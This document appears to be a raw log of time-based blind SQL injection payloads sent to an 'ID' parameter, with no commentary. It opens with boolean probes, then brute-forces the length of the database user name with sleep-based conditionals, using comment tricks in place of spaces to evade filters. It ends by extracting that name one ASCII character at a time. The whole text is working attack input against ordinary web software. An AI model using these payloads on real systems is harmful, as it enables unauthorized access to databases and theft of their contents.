ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1'/**/and/**/if(length(user())=48,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=49,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=50,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=51,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=52,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=53,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=54,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=55,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=56,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=57,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=58,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=59,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=60,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=61,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=62,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=63,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=64,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=65,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=66,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=67,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=68,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=69,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=70,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=71,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=72,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=73,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=74,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=75,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=76,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=77,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=78,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=79,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=80,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=81,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=82,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=83,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=84,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=85,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=86,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=87,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=88,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=89,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=90,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=91,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=92,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=93,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=94,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=95,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=96,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=97,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=98,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=15,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=16,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=17,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=18,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=19,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=20,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=21,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=22,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=23,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=24,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=25,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=26,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=27,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=28,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=29,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=30,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=31,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=32,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=33,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=34,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=35,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=36,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=37,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=38,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=39,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=40,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=41,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=42,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=43,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=44,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=45,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=46,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=47,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=48,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=49,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=50,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=51,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=52,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=53,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=54,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=55,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=56,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=57,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=58,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=59,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=60,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=61,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=62,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=63,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=64,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=65,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=66,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=67,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=68,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=69,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=70,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=71,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=72,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=73,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=74,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=75,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=76,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=77,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=78,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=79,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=80,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=81,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=82,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=83,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=84,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=85,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=86,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=87,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=88,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=89,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=90,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=91,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=92,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=93,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=94,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=95,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=96,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=97,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=98,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=15,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=16,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=17,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=18,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=19,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=20,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=21,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=22,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=23,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=24,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=25,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=26,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=27,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=28,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=29,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=30,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=31,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=32,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=33,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=34,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=35,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=36,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=37,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=38,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=39,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=40,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=41,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=42,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=43,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=44,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=45,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=46,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=47,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=48,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=49,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=50,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=51,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=52,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=53,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=54,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=55,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=56,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=57,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=58,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=59,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=60,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=61,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=62,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=63,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=64,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=65,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=66,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=67,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=68,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=69,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=70,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=71,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=72,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=73,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=74,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=75,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=76,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=77,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=78,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=79,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=80,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=81,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=82,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=83,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=84,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=85,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=86,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=87,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=88,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=89,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=90,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=91,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=92,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=93,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=94,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=95,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=96,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=97,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=98,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=1,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=2,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=3,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=4,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=5,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=6,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=7,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=8,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=9,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=10,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=11,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=12,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=13,sleep(3),1)-- 
ID:1'/**/and/**/if(length(user())=14,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=110,sleep(3),0)
